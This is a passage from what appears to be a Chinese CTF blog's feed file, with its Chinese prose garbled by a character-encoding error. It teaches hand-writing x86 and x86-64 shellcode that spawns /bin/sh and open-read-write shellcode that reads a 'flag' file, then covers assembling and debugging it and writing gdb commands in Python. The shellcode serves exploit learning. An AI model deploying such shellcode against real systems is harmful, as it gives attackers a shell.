id="3ã€æ€ä¹ˆç”¨æ±‡ç¼–è¯­è¨€æ„é€ ç®€å•çš„shellcodeï¼ˆ32ä½ï¼‰"><a href="#3ã€æ€ä¹ˆç”¨æ±‡ç¼–è¯­è¨€æ„é€ ç®€å•çš„shellcodeï¼ˆ32ä½ï¼‰" class="headerlink" title="3ã€æ€ä¹ˆç”¨æ±‡ç¼–è¯­è¨€æ„é€ ç®€å•çš„shellcodeï¼ˆ32ä½ï¼‰"></a>3ã€æ€ä¹ˆç”¨æ±‡ç¼–è¯­è¨€æ„é€ ç®€å•çš„shellcodeï¼ˆ32ä½ï¼‰</h1><p>å‰ç½®çŸ¥è¯†ï¼š</p><p>â‘ å¯¹äº32ä½ç¨‹åºè€Œè¨€ï¼Œæˆ‘ä»¬æœ€åç³»ç»Ÿè°ƒç”¨é‡‡ç”¨çš„å¹¶ä¸æ˜¯syscallï¼Œè€Œæ˜¯int 0x80</p><p>â‘¡æˆ‘ä»¬ä¼ å‚çš„å‰ä¸‰ä¸ªå¯„å­˜å™¨åˆ†åˆ«æ˜¯ebx,ecx,edx</p><p>â‘¢32ä½çš„execveç³»ç»Ÿè°ƒç”¨å·æ˜¯11ï¼Œå¹¶ä¸”å­˜å‚¨ç³»ç»Ÿè°ƒç”¨åçš„å¯„å­˜å™¨æ˜¯eaxã€‚32ä½çš„ç³»ç»Ÿè°ƒç”¨å·å¯ä»¥æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h</p><p>ç„¶åå‰©ä¸‹çš„æ€è·¯æ˜¯å’Œ64ä½æ±‡ç¼–æ„é€ shellcodeçš„æ€è·¯æ˜¯ä¸€æ ·çš„ã€‚</p><p>é¦–å…ˆæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br></pre></td></tr></table></figure><p>æ¸…ç©ºä¸¤ä¸ªå‚æ•°ä¸º0çš„å¯„å­˜å™¨</p><p>ç„¶åæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æŠŠå‚æ•°&#x2F;bin&#x2F;shå‹å…¥æ ˆï¼Œæœ€å¼€å§‹push ebxæ˜¯å…ˆå‹å…¥æ ˆä¸­ä¸€ä¸ª0ï¼Œç”¨æ¥å­—ç¬¦ä¸²æˆªæ–­ã€‚æœ€åå°†espæŒ‡å‘çš„åœ°å€èµ‹ç»™äº†ebxï¼Œæ­¤æ—¶ebxçš„å€¼å°±æ˜¯&#x2F;bin&#x2F;shçš„åœ°å€ã€‚</p><p><img src="/../img/HwopUbyABF6SDzc.png"></p><p>æ­¤æ—¶æ ˆä¸­çš„æƒ…å†µå°±æ˜¯è¿™æ ·ï¼Œ&#x2F;bin&#x2F;shä¸&#x2F;bin&#x2F;&#x2F;shçš„æ•ˆæœä¸€æ ·ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦å­˜å…¥å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¦åç€å†™ï¼Œåœ¨64ä½æ±‡ç¼–ç¼–å†™shellcodeçš„æ—¶å€™ï¼Œå·²ç»è§£é‡Šè¿‡äº†ï¼Œè¿™é‡Œå°±ä¸å†é‡å¤ã€‚</p><p>æœ€åæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>ç°åœ¨æ˜¯æŠŠç³»ç»Ÿè°ƒç”¨å·å­˜è¿›å»å¹¶ä¸”è¿›è¡Œäº†ç³»ç»Ÿè°ƒç”¨</p><p>æœ€åæŠŠè¿™ä¸‰éƒ¨åˆ†ç»“åˆä¸€ä¸‹æ•ˆæœå¦‚ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h1 id="4ã€æ‰‹å†™openï¼Œreadï¼Œwriteçš„shellcode"><a href="#4ã€æ‰‹å†™openï¼Œreadï¼Œwriteçš„shellcode" class="headerlink" title="4ã€æ‰‹å†™openï¼Œreadï¼Œwriteçš„shellcode"></a>4ã€æ‰‹å†™openï¼Œreadï¼Œwriteçš„shellcode</h1><p>é‡è§pwné¢˜å¼€å¯äº†æ²™ç®±ä¿æŠ¤çš„è¯ï¼Œå¦‚æœç¦ç”¨äº†execveã€systemå‡½æ•°ï¼Œä½†æ²¡æœ‰å¼€å¯NXä¿æŠ¤çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨orwçš„æ–¹å¼æ¥è¯»å‡ºflagã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è¦æ‰§è¡Œçš„å¦‚ä¸‹çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)<span class="comment">#ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯3ï¼Œå› ä¸ºä¸€ä¸ªè¿›ç¨‹æœ‰é»˜è®¤çš„æ–‡ä»¶æè¿°ç¬¦0,1,2ã€‚å½“å†æ‰“å¼€æ–°çš„æ–‡ä»¶ä¹‹åï¼Œæ–‡ä»¶æè¿°ç¬¦å°±ä¼šä»¥æ­¤ç±»æ¨çš„åˆ†é…ï¼Œå› æ­¤ä¸Šé¢openæ–°æ‰“å¼€çš„flagæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦å°±æ˜¯3</span></span><br><span class="line"><span class="comment">#è‡³äºè¿™ä¸ªaddrï¼ŒæŠŠè¯»å‡ºæ¥çš„flagæ”¾åˆ°å“ªï¼Œä¸€ä¼šå†è¯´</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œå°±å¼€å§‹ç”¨æ±‡ç¼–æ¥å®ç°ä¸Šé¢çš„å†…å®¹(å…ˆå†™64ä½çš„)ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#ä¸Šé¢è¿™ä¸¤æ­¥å°±æ˜¯åœ¨ä¼ opençš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°è¦æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€è¦æŒ‡å‘å­—ç¬¦ä¸²&#x27;flag&#x27;</span><br><span class="line">#æ‰§è¡Œå®Œpush 0x67616c66çš„æ—¶å€™ï¼Œæ ˆé¡¶çš„å†…å®¹å°±æ˜¯å­—ç¬¦ä¸²flagï¼Œè€Œæ ˆé¡¶æŒ‡é’ˆrspå°±æŒ‡å‘äº†è¿™ä¸ªflagï¼Œ</span><br><span class="line">#æ­¤æ—¶æ‰§è¡Œpush rspå°†æŒ‡å‘flagçš„åœ°å€ï¼ˆä¹Ÿå°±æ˜¯rspï¼‰å‹æ ˆï¼Œæ­¤æ—¶æ ˆé¡¶çš„å†…å®¹å°±æ˜¯é‚£ä¸ªæŒ‡å‘flagçš„åœ°å€ï¼Œç„¶åå†æ‰§è¡Œpop rdi</span><br><span class="line">#å°†æ ˆé¡¶çš„è¿™ä¸ªå†…å®¹å¼¹ç»™rdiï¼Œæ­¤æ—¶opençš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æˆä¸ºäº†æŒ‡å‘flagçš„åœ°å€</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">read(3,addr,0x50)</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">#ä¸Šé¢è¿™ä¸¤æ­¥åœ¨å®Œæˆreadå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¼ å‚ï¼Œæ­¤æ—¶å‹å…¥æ ˆçš„rspï¼Œæˆ‘å¹¶ä¸çŸ¥é“è¿™ä¸ªæ ˆåœ°å€å…·ä½“æ˜¯å¤šå°‘</span><br><span class="line">#åªçŸ¥é“æŠŠè¿™ä¸ªåœ°å€ç»™rsiçš„è¯ï¼Œflagå°±ä¼šè¢«å†™åˆ°è¿™ä¸ªåœ°å€é‡Œé¢ï¼Œè‡³äºè¿™ä¸ªåœ°å€å…·ä½“æ˜¯ä»€ä¹ˆå¹¶ä¸é‡è¦ï¼ˆåªè¦ä¸ä¼šå¯¼è‡´å †æ ˆå´©æºƒçš„è¯ï¼‰</span><br><span class="line">#é‡è¦çš„æ˜¯è¦ä¿è¯æ¥ä¸‹æ¥writeçš„ç¬¬äºŒä¸ªå‚æ•°ä¹Ÿæ˜¯è¿™ä¸ªåœ°å€å³å¯ï¼Œè€Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯ä¿è¯æ¥ä¸‹æ¥çš„</span><br><span class="line">#æ¯ä¸€ä¸ªpushéƒ½è¦å¯¹åº”ä¸€ä¸ªpopï¼Œè¿™æ ·æ ˆé¡¶å§‹ç»ˆå°±æ˜¯ç»™å½“åˆrsiçš„é‚£ä¸ªåœ°å€äº†ã€‚</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">write(1,addr,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">#è¿™ä¸ªåœ°æ–¹çš„push rsp pop rsiåŸç†åŒä¸Š</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯32ä½çš„ï¼Œ32ä½å’Œ64ä½ç¼–å†™çš„åŒºåˆ«ä¸»è¦æ˜¯<strong>å¯„å­˜å™¨ä¸åŒ</strong>å’Œ<strong>ç³»ç»Ÿè°ƒç”¨å·ä¸åŒ</strong>ï¼Œå¦å¤–å°±æ˜¯<strong>å†å‹å…¥å‚æ•°â€™flagâ€™çš„æ—¶å€™ï¼Œ32ä½çš„éœ€è¦æå‰å‹å…¥00ç”¨æ¥æˆªæ–­å­—ç¬¦ä¸²</strong>ï¼ˆ64ä½ä¸éœ€è¦push 0çš„åŸå› æ˜¯å­˜å…¥çš„â€™flagâ€™ä¸è¶³8å­—èŠ‚ï¼Œä¼šè‡ªåŠ¨æ·»åŠ 00æ¥æˆªæ–­ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h1 id="5ã€å¦‚ä½•è°ƒè¯•æˆ–æµ‹è¯•å†™å¥½çš„æ±‡ç¼–ä»£ç ï¼Ÿ"><a href="#5ã€å¦‚ä½•è°ƒè¯•æˆ–æµ‹è¯•å†™å¥½çš„æ±‡ç¼–ä»£ç ï¼Ÿ" class="headerlink" title="5ã€å¦‚ä½•è°ƒè¯•æˆ–æµ‹è¯•å†™å¥½çš„æ±‡ç¼–ä»£ç ï¼Ÿ"></a>5ã€å¦‚ä½•è°ƒè¯•æˆ–æµ‹è¯•å†™å¥½çš„æ±‡ç¼–ä»£ç ï¼Ÿ</h1><p>å› ä¸ºåœ¨ç¼–å†™shellcodeçš„æ—¶å€™ï¼Œå¹¶ä¸æ˜¯ä¸€å¸†é£é¡ºçš„ï¼Œå¦‚æœå‡ºç°äº†é”™è¯¯åªé çœ¼ç›çœ‹çš„è¯æ•ˆæœä¸å¤§ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠæ±‡ç¼–ä»£ç ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç”¨gdbæ¥è°ƒè¯•ã€‚</p><p>å…ˆç”¨touch shellcode.asm  å‘½ä»¤åˆ›å»ºä¸€ä¸ªshellcode.asmæ–‡ä»¶(asmæ–‡ä»¶æ˜¯ä½¿ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™çš„æºä»£ç æ–‡ä»¶)</p><p>ç„¶åvim shellcode.asm  å»ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶</p><p>å°†æ±‡ç¼–çš„å†…å®¹å†™å…¥è¿™ä¸ªæ–‡ä»¶é‡Œé¢ã€‚</p><p>ï¼ˆåŒæ—¶åœ¨æ–‡ä»¶çš„å¼€å¤´å†™ä¸Šä¸‹é¢ä¸‰è¡Œçš„å†…å®¹ï¼Œå…¶ä½œç”¨å¯ä»¥è‡ªè¡Œå‚è€ƒ<a href="https://www.cnblogs.com/lazypigwhy/articles/14112041.html">ã€è½¬ã€‘linuxæ±‡ç¼–.section .text .data ä¸.global - æ¯”è¾ƒæ‡’ - åšå®¢å›­ (cnblogs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br></pre></td></tr></table></figure><p>æœ€åçš„å†™å…¥çš„å†…å®¹åº”è¯¥æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨nasm -f elf64 shellcode.asmè¿™ä¸ªå‘½ä»¤å»ç¼–è¯‘åˆšæ‰å†™çš„é‚£ä¸ªæ–‡ä»¶ï¼ˆä¼šç”Ÿæˆä¸€ä¸ª.oæ–‡ä»¶ï¼‰</p><p>ç„¶åå¯ä»¥ç”¨ objdump -d shellcode.o ï¼ˆç›´æ¥æŸ¥çœ‹çš„è¯ï¼Œæ˜¯çœ‹çš„AT&amp;Tè¯­æ³•çš„æ±‡ç¼–ï¼Œå¦‚æœæƒ³çœ‹intelè¯­æ³•çš„è¯åŠ ä¸Š-M intelå‚æ•°å³å¯</p><p><img src="/../img/HOilK7ZeAynEY5m.png"></p><p>æ­¤æ—¶å°±è·å–åˆ°äº†æ±‡ç¼–æŒ‡ä»¤çš„æœºå™¨ç ã€‚</p><p>ä¸è¿‡ç”±äºç›®å‰ç”Ÿæˆçš„ä»…ä»…æ˜¯.oæ–‡ä»¶ï¼Œæ²¡æœ‰è¢«é“¾æ¥è¿‡ï¼Œè¿˜æ— æ³•æ‰§è¡Œæˆ–è€…è°ƒè¯•ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦é“¾æ¥ä¸€ä¸‹ã€‚</p><p>è¾“å…¥å‘½ä»¤ld -s -o shellcode shellcode.o å³å¯</p><p>æ­¤æ—¶æ‰§è¡Œç”Ÿæˆçš„shellcodeå°±æˆåŠŸäº†ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/wX7aQLldJvpA6xU.png" alt="image-20220607171010492"></p><p>å¦‚æœæƒ³è°ƒè¯•çš„è¯ï¼Œç›´æ¥gdbæŒ‚ä¸Šï¼Œç„¶åstartå°±å¯ä»¥å¼€å§‹è°ƒè¯•æˆ‘ä»¬å†™çš„shellcodeäº†ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/LKn97vORyN8bX1j.png" alt="image-20220607171241208"><br><strong>è¡¥å……ï¼šæ¨èä¸€ä¸ªåœ¨çº¿æ±‡ç¼–æŒ‡ä»¤è½¬æœºå™¨ç çš„ç½‘ç«™  <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">here</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcodeç¼–å†™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”¨pythonæ¥è‡ªå®šä¹‰gdbå‘½ä»¤</title>
      <link href="/posts/26ba4673.html"/>
      <url>/posts/26ba4673.html</url>
      
        <content type="html"><![CDATA[<p><code>gdb</code> æ˜¯ä¸€æ¬¾ <code>linux</code> ä¸‹å¸¸ç”¨çš„ç¨‹åºè°ƒè¯•å™¨ï¼Œæœ‰æ—¶å¯èƒ½æˆ‘ä»¬ä¼šæ ¹æ®è‡ªå·±çš„éœ€æ±‚æ¥å°è¯•å†™ä¸€äº›è‡ªå®šä¹‰çš„ <code>gdb</code> å‘½ä»¤ï¼Œè€Œé€šè¿‡ <code>python</code> è¯­è¨€æ¥ç¼–å†™çš„è¯ï¼Œæ˜¯å†å¥½ä¸è¿‡äº†ï¼Œä¸‹é¢è®°å½•ä¸€ä¸‹å¦‚ä½•ç”¨ <code>python</code> è¯­è¨€ç¼–å†™è‡ªå·±çš„ <code>gdb</code> å‘½ä»¤</p><p>æœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯ç›´æ¥åœ¨ <code>.gdbinit</code> æ–‡ä»¶ä¸­æ¥ç¼–å†™ï¼Œå¦‚æœåªæ˜¯è‡ªå®šä¹‰ä¸€ä¸ªæˆ–å¾ˆå°‘çš„å‘½ä»¤é‡‡ç”¨è¿™ç§æ–¹æ³•æ˜¯å¯ä»¥çš„ã€‚ï¼ˆ <code>gdb</code> å¯åŠ¨æ—¶ï¼Œä¼šåœ¨å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•å¯»æ‰¾ä¸€ä¸ª <code>.gdbinit</code> çš„æ–‡ä»¶ï¼Œå¦‚æœè¯¥æ–‡ä»¶å­˜åœ¨çš„è¯å°†æ‰§è¡Œè¯¥æ–‡ä»¶çš„æ‰€æœ‰å‘½ä»¤ï¼‰</p><p>å‡è®¾ç°åœ¨ç¼–å†™ä¸€ä¸ªè·å– <code>libc</code> åŸºåœ°å€çš„å‘½ä»¤,ä»£ç å¦‚ä¸‹</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libc_cmd</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    line = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> line:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">list</span>=i.split(<span class="string">&quot;    &quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mlibc base\033[0m    &quot;</span>,<span class="built_in">list</span>[<span class="number">1</span>])</span><br><span class="line">end </span><br><span class="line"></span><br><span class="line">define libc</span><br><span class="line">    python libc_cmd()</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ ¼å¼æ˜¯å…ˆåœ¨ä¸€è¡Œå†™ä¸‹ <code>python</code> ï¼Œæ¥ä¸‹æ¥æ­£å¸¸ç¼–å†™å‡½æ•°å³å¯ï¼ˆ <code>gdb.execute</code> å‡½æ•°å¯ä»¥åœ¨ <code>gdb</code> å†…éƒ¨æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å‘½ä»¤çš„æ‰§è¡Œç»“æœè¿”å›ç»™è°ƒç”¨è€… ï¼‰ï¼Œæœ€åä»¥ <code>end</code> ç»“å°¾ã€‚ç„¶åå†ç”¨ <code>define</code> æ¥å®šä¹‰è¿™ä¸ªå‘½ä»¤çš„åç§°ï¼Œç„¶åä¸‹ä¸€è¡Œç”¨ <code>python</code> è°ƒç”¨ä¸Šé¢çš„å‡½æ•°ï¼Œæœ€åä»¥ <code>end</code> ç»“å°¾å³å¯ã€‚</p><p>æŠŠä¸Šé¢çš„ä»£ç å¤åˆ¶åˆ° <code>.gdbinit</code> æ–‡ä»¶ä¸­ï¼Œå¯åŠ¨ <code>gdb</code> å³å¯æ­£å¸¸ä½¿ç”¨ <code>libc</code> å‘½ä»¤</p><p>ä½†å¦‚æœæƒ³è‡ªå®šä¹‰çš„å‘½ä»¤å¾ˆå¤šçš„è¯ï¼Œå…¨éƒ¨æŠŠå‘½ä»¤éƒ½å†™åˆ° <code>.gdbinit</code> ä¼šæ˜¾å¾—å¾ˆè‡ƒè‚¿ï¼Œæ‰€ä»¥å¯ä»¥æŠŠè‡ªå®šä¹‰çš„å‘½ä»¤å•ç‹¬éƒ½å­˜æ”¾åˆ°ä¸€ä¸ª <code>py</code> æ–‡ä»¶ä¸­ã€‚æ¯”å¦‚åˆ›å»ºä¸€ä¸ªå«åš <code>command.py</code> çš„æ–‡ä»¶ï¼Œç„¶ååœ¨ <code>.gdbinit</code> çš„å¼€å§‹å†™å…¥ <code>source /home/zikh/Desktop/command.py</code> å³å¯ï¼Œç„¶åå¼€å§‹åœ¨ <code>command.py</code> æ–‡ä»¶ä¸­ç¼–å†™å‘½ä»¤ã€‚</p><p>æ¯”å¦‚æˆ‘è¿™é‡Œç¼–å†™ä¸€ä¸ªè·å– <code>libc</code> åŸºåœ°å€ã€å †åœ°å€å’Œç¨‹åºåŸºåœ°å€çš„å‘½ä»¤,ä»£ç å¦‚ä¸‹</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base_cmd</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    flag1=<span class="number">0</span></span><br><span class="line">    flag2=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">match</span>=[]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;home&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag1==<span class="number">0</span>:</span><br><span class="line">            flag1=<span class="number">1</span></span><br><span class="line">            line=line.split()</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    base_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;heap&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag==<span class="number">0</span>:</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            line=line.split()</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    heap_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag2==<span class="number">0</span>:</span><br><span class="line">            flag2=<span class="number">1</span></span><br><span class="line">            line=line.split()     </span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    libc_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mbase address\033[0m\t\t\t&quot;</span>,base_addr)</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;\033[0;32;47mno heap\033[0m&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mheap base\033[0m\t\t\t&quot;</span>,heap_addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mlibc base\033[0m\t\t\t&quot;</span>,libc_addr)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ ¼å¼æ¯”è¾ƒç®€å•ï¼Œé¦–å…ˆåœ¨ <code>py</code> æ–‡ä»¶çš„å¼€å¤´å¯¼å…¥ <code>gdb</code> æ¨¡å—ï¼Œç„¶åæ­£å¸¸å®šä¹‰å‡½æ•°å³å¯ï¼Œæœ€åå†™ä¸Š <code>gdb.execute(&quot;define base\n\tpython base_cmd()\nend&quot;)</code> ï¼Œè¿™å¥ä¸€å®šè¦æœ‰ï¼Œè¿™ä¸ªå¯ä»¥ç†è§£ä¸ºä½ è¾“å…¥ä¸€ä¸ªå‘½ä»¤ï¼Œç„¶å <code>gdb</code> è¦æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨è¿™ä¸ªå‘½ä»¤çš„å®šä¹‰ï¼Œåªæœ‰åŠ ä¸Šæœ€åä¸€å¥ï¼Œæ‰èƒ½å¤Ÿè¯†åˆ«å‡ºæ¥è¿™ä¸ªå‘½ä»¤ã€‚ï¼ˆæ¯å†™ä¸€ä¸ªå‘½ä»¤ï¼Œéƒ½éœ€è¦åŠ ä¸Š <code>gdb.execute</code> çš„å‘½ä»¤å£°æ˜ï¼‰</p><p>å®é™…è¿è¡Œæƒ…å†µå¦‚ä¸‹ï¼š</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041312961.png" alt="image-20230204131253466" style="zoom:50%;" /><p>å¦‚æœè¦å†™å¸¦å‚æ•°å‘½ä»¤çš„è¯ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹æ ¼å¼</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_cmd</span>(<span class="params">arg0</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;decimal :\t&quot;</span>,arg0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hexadecimal\t&quot;</span>,<span class="built_in">hex</span>(arg0))</span><br><span class="line">gdb.execute(<span class="string">&quot;define hex\n\tpython hex_cmd(int($arg0))\nend&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041315210.png" alt="image-20230204131502126"></p><p>æœ¬æ–‡åªæ˜¯ç®€å•è®°å½•ä¸€ä¸‹å¦‚ä½•ç”¨ <code>python</code> æ¥ç¼–å†™ <code>gdb</code> å‘½ä»¤ï¼Œè‡³äºç¼–å†™ä»€ä¹ˆå‘½ä»¤ï¼Œè¿˜æ˜¯è¦æ ¹æ®è‡ªå·±çš„å®é™…éœ€æ±‚æ¥è€ƒè™‘ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å°è¯•å¼€å‘å°å·¥å…· </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>çˆ†ç ´canary+åå¼¹shell</title>
      <link href="/posts/3eb93c75.html"/>
      <url>/posts/3eb93c75.html</url>
      
